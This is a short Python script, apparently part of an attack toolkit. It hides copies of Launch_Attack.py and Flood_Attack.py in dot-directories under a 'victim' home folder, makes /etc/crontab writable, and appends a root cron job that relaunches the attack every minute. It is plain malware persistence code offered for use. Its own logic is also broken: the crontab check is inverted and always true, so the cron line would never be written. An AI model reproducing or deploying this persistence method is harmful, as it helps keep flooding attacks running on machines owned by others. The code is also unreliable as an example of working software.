import os

attackDirs = ['/home/victim/.etc/.module', '/home/victim/.var/.module']
attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
attackCommand = '* * * * * root /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py || (/usr/bin/python /home/victim/.var/.module/Launch_Attack.py)'


def check_attack():
    if not is_set_up_attack():
        set_up_attack()

    if not is_set_up_crontab():
        print('Set up crontab...')
        set_up_crontab()
    else:
        print('Already set up crontab.')


def set_up_attack():
    # Make directories
    for attackDir in attackDirs:
        os.system('mkdir {0}'.format(attackDir))
        os.system('cp Launch_Attack.py {0}/Launch_Attack.py'.format(attackDir))
        os.system('cp b.py {0}/Check_Attack.py'.format(attackDir))
        os.system('cp Flood_Attack.py {0}/Flood_Attack.py'.format(attackDir))

    return


def set_up_crontab():
    if not is_set_up_crontab():
        return

    # Write Crontab
    os.system('chmod +w /etc/crontab')

    crontab = open('/etc/crontab', 'a')

    crontab.write(attackCommand)
    crontab.close()


def is_set_up_attack():
    for attackDir in attackDirs:
        for attackFile in attackFiles:
            if not os.path.isfile(attackDir + attackFile):
                return False

    return True


def is_set_up_crontab():
    # Read Crontab
    os.system('chmod +r /etc/crontab')

    crontab = open('/etc/crontab', 'r')

    result = False

    for line in crontab:
        if line.find('Launch_Attack.py'):
            result = True

    crontab.close()

    return result


if __name__ == '__main__':
    check_attack()
